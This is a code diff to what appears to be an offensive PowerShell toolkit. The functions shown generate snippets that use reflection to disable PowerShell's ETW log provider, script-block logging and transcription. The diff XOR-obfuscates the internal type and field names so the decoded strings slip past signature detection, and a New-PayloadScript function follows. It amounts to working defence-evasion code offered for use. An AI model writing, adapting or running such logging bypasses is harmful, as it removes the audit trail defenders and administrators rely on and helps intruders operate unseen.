@@ -74,7 +74,13 @@ function Get-EtwBypassSnippet {
 
     switch ($Technique) {
         'provider' {
-            return "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Trac'+'ing.PSEtwLog'+'Provider').GetField('etwPro'+'vider','NonPublic,Static').GetValue(`$null)|%{[System.Diagnostics.Eventing.EventProvider].GetField('m_en'+'abled','NonPublic,Instance').SetValue(`$_,[Byte]0)}}catch{}"
+            # XOR key=13 decodes PSEtwLogProvider type, etwProvider field, EventProvider type, m_enabled field at runtime.
+            return (
+                "try{`$_k=13;" +
+                "`$_ep=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,89,127,108,110,100,99,106,35,93,94,72,121,122,65,98,106,93,127,98,123,100,105,104,127)|%{`$_-bxor`$_k})));" +
+                "`$_ep.GetField([string]::new([char[]]([byte[]](104,121,122,93,127,98,123,100,105,104,127)|%{`$_-bxor`$_k})),'NonPublic,Static').GetValue(`$null)|%{" +
+                "[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,73,100,108,106,99,98,126,121,100,110,126,35,72,123,104,99,121,100,99,106,35,72,123,104,99,121,93,127,98,123,100,105,104,127)|%{`$_-bxor`$_k}))).GetField([string]::new([char[]]([byte[]](96,82,104,99,108,111,97,104,105)|%{`$_-bxor`$_k})),'NonPublic,Instance').SetValue(`$_,[Byte]0)}}catch{}"
+            )
         }
 
         'patch' {
@@ -110,9 +116,15 @@ function Get-EtwBypassSnippet {
 }
 
 function Get-SblBypassSnippet {
+    # XOR key=13 decodes ScriptBlock type, checkScriptBlockLoggingCache, Utils type, cachedGroupPolicySettings at runtime.
     return (
-        "try{[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{};" +
-        "try{`$_gp=[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Ut'+'ils').GetField('cachedGroup'+'PolicySettings','NonPublic,Static').GetValue(`$null);if(`$_gp['Transcription']){`$_gp['Transcription']['EnableTranscripting']=0}}catch{}"
+        "try{`$_k=13;" +
+        "`$_sb=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,94,110,127,100,125,121,79,97,98,110,102)|%{`$_-bxor`$_k})));" +
+        "`$_sb.GetField([string]::new([char[]]([byte[]](110,101,104,110,102,94,110,127,100,125,121,79,97,98,110,102,65,98,106,106,100,99,106,78,108,110,101,104)|%{`$_-bxor`$_k})),'NonPublic,Static').SetValue(`$null,[Boolean]`$false)}catch{};" +
+        "try{`$_k=13;" +
+        "`$_ut=[psobject].Assembly.GetType([string]::new([char[]]([byte[]](94,116,126,121,104,96,35,64,108,99,108,106,104,96,104,99,121,35,76,120,121,98,96,108,121,100,98,99,35,88,121,100,97,126)|%{`$_-bxor`$_k})));" +
+        "`$_gp=`$_ut.GetField([string]::new([char[]]([byte[]](110,108,110,101,104,105,74,127,98,120,125,93,98,97,100,110,116,94,104,121,121,100,99,106,126)|%{`$_-bxor`$_k})),'NonPublic,Static').GetValue(`$null);" +
+        "if(`$_gp['Transcription']){`$_gp['Transcription']['EnableTranscripting']=0}}catch{}"
     )
 }
 function New-PayloadScript {
